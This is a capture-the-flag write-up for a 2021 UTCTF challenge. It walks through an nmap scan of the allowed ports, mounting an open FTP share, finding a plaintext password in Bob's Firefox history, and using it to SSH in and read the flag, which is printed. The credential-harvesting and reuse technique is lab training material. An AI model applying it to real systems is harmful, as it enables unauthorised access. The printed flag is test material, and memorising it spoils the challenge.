#### Challenge:

Hack Bob's box!

`nmap` is allowed for this problem only. 
*However*, you may only target `misc.utctf.live:8121` and 
`misc.utctf.live:8122` with `nmap`. [bobs-ftp.tar](./bobs-ftp.tar ":ignore")

---

#### Solution:

```console
# nmap -sV -p 8121,8122 misc.utctf.live
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-13 22:54 CET
Nmap scan report for misc.utctf.live (3.236.87.2)
Host is up (0.17s latency).
rDNS record for 3.236.87.2: ec2-3-236-87-2.compute-1.amazonaws.com

PORT     STATE SERVICE VERSION
8121/tcp open  ftp     Pure-FTPd
8122/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds
```

```bash
mkdir ftp
curlftpfs misc.utctf.live:8121 ./ftp/
```

- while inspecting `firefox` history `./ftp/.mozilla/firefox/yu85tipn.bob/places.sqlite` we found credentials for website `http://bobsite.com/login?user=bob&pass=i-l0v3-d0lph1n5`

```bash
sshpass -p i-l0v3-d0lph1n5  ssh bob@misc.utctf.live -p 8122  cat /flag.txt
```

---

<details><summary>FLAG:</summary>

```
utflag{red_teams_are_just_glorified_password_managers}
```

</details>
<br/>
